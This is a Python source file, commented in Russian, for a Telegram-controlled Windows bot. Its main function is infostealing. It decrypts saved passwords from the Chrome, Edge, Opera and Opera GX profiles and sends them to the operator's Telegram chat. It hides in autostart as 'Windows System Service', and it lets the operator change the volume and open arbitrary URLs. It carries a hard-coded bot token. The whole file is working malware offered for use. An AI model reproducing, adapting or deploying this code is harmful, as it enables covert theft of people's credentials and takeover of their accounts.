# -*- coding: utf-8 -*-

import os
import json
import base64
import sqlite3
import shutil
import logging
import winreg
import sys
import webbrowser
from urllib.parse import urlparse

# --- Установка зависимостей ---
# pip install --upgrade python-telegram-bot pypiwin32 cryptography pyautogui

# --- (НОВОЕ) Библиотеки для мьютекса (защиты от повторного запуска) ---
import win32event
import win32api
import winerror

# --- Библиотеки для основных функций ---
import pyautogui
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- Библиотеки для Telegram ---
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# --- ВАШИ ДАННЫЕ (ОБЯЗАТЕЛЬНО ВСТАВЬТЕ СВОЙ ТОКЕН!) ---
BOT_TOKEN = '7695041312:AAFMo7LpbuKm6do2rhZj8Ib4Pjwx2PPy0kA' # <-- ВСТАВЬТЕ ВАШ ТОКЕН СЮДА

# --- Настройка логирования ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ---
STARTUP_APP_NAME = "Windows System Service" # Имя для автозагрузки
MUTEX_NAME = "SpectraBotGlobalMutex_Vlad"   # (НОВОЕ) Уникальное имя для мьютекса

# ==============================================================================
# --- ЛОГИКА СБОРА УЧЕТНЫХ ДАННЫХ С БРАУЗЕРОВ ---
# ==============================================================================

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception as e:
        logger.error(f"Не удалось получить главный ключ из {browser_path}: {e}"); return None

def decrypt_password(password, master_key):
    try:
        return AESGCM(master_key).decrypt(password[3:15], password[15:], None).decode()
    except Exception:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception: return "Не удалось расшифровать"

def get_browser_credentials():
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    browser_paths = {
        "Google Chrome": os.path.join(appdata, "Google", "Chrome", "User Data"),
        "Microsoft Edge": os.path.join(appdata, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
    }
    all_credentials = []

    for browser_name, browser_path in browser_paths.items():
        if not os.path.exists(browser_path): continue
        master_key = get_master_key(browser_path)
        if not master_key: continue
        
        profile_dirs = [d for d in os.listdir(browser_path) if d.startswith('Profile ') or d == 'Default']
        
        for profile in profile_dirs:
            login_db_path = os.path.join(browser_path, profile, "Login Data")
            if not os.path.exists(login_db_path): continue
            
            temp_db = f"temp_db_copy.db"
            shutil.copyfile(login_db_path, temp_db)
            
            conn = None
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, enc_password in cursor.fetchall():
                    if username and enc_password:
                        password = decrypt_password(enc_password, master_key)
                        if password != "Не удалось расшифровать":
                            all_credentials.append({
                                "source": f"{browser_name} ({profile})", "url": url, "login": username, "password": password
                            })
            except Exception as e: logger.error(f"Ошибка чтения БД для {browser_name} ({profile}): {e}")
            finally:
                if conn: conn.close()
                if os.path.exists(temp_db): os.remove(temp_db)
    return all_credentials

def get_registered_sites():
    creds = get_browser_credentials()
    if not creds: return []
    sites = {urlparse(cred['url']).netloc for cred in creds if urlparse(cred['url']).netloc}
    return sorted(list(sites))

# ==============================================================================
# --- ФУНКЦИИ УПРАВЛЕНИЯ СИСТЕМОЙ ---
# ==============================================================================
def manage_startup(add: bool):
    exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            if add:
                winreg.SetValueEx(key, STARTUP_APP_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
                return True, "Скрипт успешно добавлен в автозагрузку."
            else:
                try:
                    winreg.DeleteValue(key, STARTUP_APP_NAME)
                    return True, "Скрипт успешно удален из автозагрузки."
                except FileNotFoundError:
                    return True, "Скрипт уже отсутствовал в автозагрузке."
    except Exception as e:
        return False, f"Ошибка при работе с реестром: {e}"

def is_in_startup():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ) as key:
            winreg.QueryValueEx(key, STARTUP_APP_NAME)
        return True
    except FileNotFoundError:
        return False

def set_volume(level: int):
    try:
        level = max(0, min(100, level))
        pyautogui.press('volumemute'); pyautogui.press('volumemute')
        for _ in range(50): pyautogui.press('volumedown')
        for _ in range(level // 2): pyautogui.press('volumeup')
        return True, f"Громкость установлена на {level}%."
    except Exception as e:
        return False, f"Не удалось изменить громкость: {e}"

def open_website(url: str):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        webbrowser.open(url)
        return True, f"Ссылка `{url}` успешно открыта."
    except Exception as e:
        return False, f"Не удалось открыть ссылку: {e}"

# ==============================================================================
# --- ЛОГИКА ТЕЛЕГРАМ-БОТА ---
# ==============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, message_text=None):
    keyboard = [
        [InlineKeyboardButton("🔑 Сбор данных", callback_data='menu_data')],
        [InlineKeyboardButton("⚙️ Управление системой", callback_data='menu_system')]
    ]
    text = message_text or "Выберите действие:"
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    action = query.data

    if action == 'main_menu': await show_main_menu(update, context)
    elif action == 'menu_data':
        keyboard = [
            [InlineKeyboardButton("🌐 Пароли из браузеров", callback_data='get_passwords')],
            [InlineKeyboardButton("🔍 Сайты с аккаунтами", callback_data='get_sites')],
            [InlineKeyboardButton("⬅️ Назад", callback_data='main_menu')]
        ]
        await query.edit_message_text("Меню сбора данных:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif action == 'menu_system':
        startup_button = (InlineKeyboardButton("🚫 Удалить из автозагрузки", callback_data='remove_startup') if is_in_startup() else InlineKeyboardButton("➕ Добавить в автозагрузку", callback_data='add_startup'))
        keyboard = [
            [startup_button],
            [InlineKeyboardButton("🔊 Установить громкость", callback_data='ask_volume')],
            [InlineKeyboardButton("⬅️ Назад", callback_data='main_menu')]
        ]
        await query.edit_message_text("Меню управления системой:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif action == 'get_passwords':
        await query.edit_message_text("⏳ Ищу пароли во всех профилях...")
        creds = get_browser_credentials()
        if not creds: await query.edit_message_text("✅ Учетные данные в браузерах не найдены.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data='menu_data')]])); return
        output = "✅ **Найденные учетные данные:**\n\n"
        for cred in creds: output += (f" источника: `{cred['source']}`\n Сайт: `{cred['url']}`\n Логин: `{cred['login']}`\n Пароль: `{cred['password']}`\n--------------------------------\n")
        from io import BytesIO
        if len(output) > 4096:
            file = BytesIO(output.encode('utf-8')); file.name = "browser_passwords.txt"
            await context.bot.send_document(chat_id=query.message.chat_id, document=file)
            await query.edit_message_text("✅ Результаты слишком большие, отправлены файлом.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data='menu_data')]]))
        else: await query.edit_message_text(output, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data='menu_data')]]))
    elif action == 'get_sites':
        await query.edit_message_text("⏳ Анализирую данные...")
        sites = get_registered_sites()
        if not sites: await query.edit_message_text("✅ Сайты с регистрациями не найдены.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data='menu_data')]])); return
        output = "✅ **Найдены аккаунты на следующих сайтах:**\n\n" + "\n".join([f"• `{site}`" for site in sites])
        await query.edit_message_text(output, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data='menu_data')]]))
    elif action in ['add_startup', 'remove_startup']:
        success, msg = manage_startup(add=(action == 'add_startup'))
        await query.answer(f"{'✅' if success else '❌'} {msg}", show_alert=True)
        # Обновляем меню системы, чтобы кнопка изменилась
        query.data = 'menu_system'; await button_callback(update, context)
    elif action == 'ask_volume':
        context.user_data['next_action'] = 'set_volume'
        await query.edit_message_text("Введите громкость от 0 до 100:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data='menu_system')]]))

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if context.user_data.get('next_action') == 'set_volume':
        context.user_data.clear()
        try:
            volume_level = int(user_input)
            success, msg = set_volume(volume_level)
            await show_main_menu(update, context, message_text=f"{'✅' if success else '❌'} {msg}")
        except ValueError: await show_main_menu(update, context, message_text="❌ Ошибка: Введите число.")
        return
    success, msg = open_website(user_input)
    await update.message.reply_text(f"{'✅' if success else '❌'} {msg}", parse_mode='Markdown')

def main():
    # (НОВОЕ) Создаем мьютекс
    mutex = win32event.CreateMutex(None, 1, MUTEX_NAME)
    # (НОВОЕ) Проверяем, не существует ли он уже
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        print("Другая копия скрипта уже запущена. Выход.")
        # (НОВОЕ) Если существует, выходим из программы
        return

    if 'ВАШ_НОВЫЙ_ТОКЕН' in BOT_TOKEN or len(BOT_TOKEN) < 40:
        print("!!! ОШИБКА: Пожалуйста, вставьте ваш настоящий BOT_TOKEN в код скрипта.")
        return

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))

    print("Бот запущен и ждет команд...")
    
    # (НОВОЕ) Оборачиваем запуск в try...finally, чтобы гарантировать освобождение мьютекса
    try:
        application.run_polling()
    finally:
        # (НОВОЕ) Освобождаем мьютекс при выходе из программы
        win32api.CloseHandle(mutex)

if __name__ == "__main__":
    main()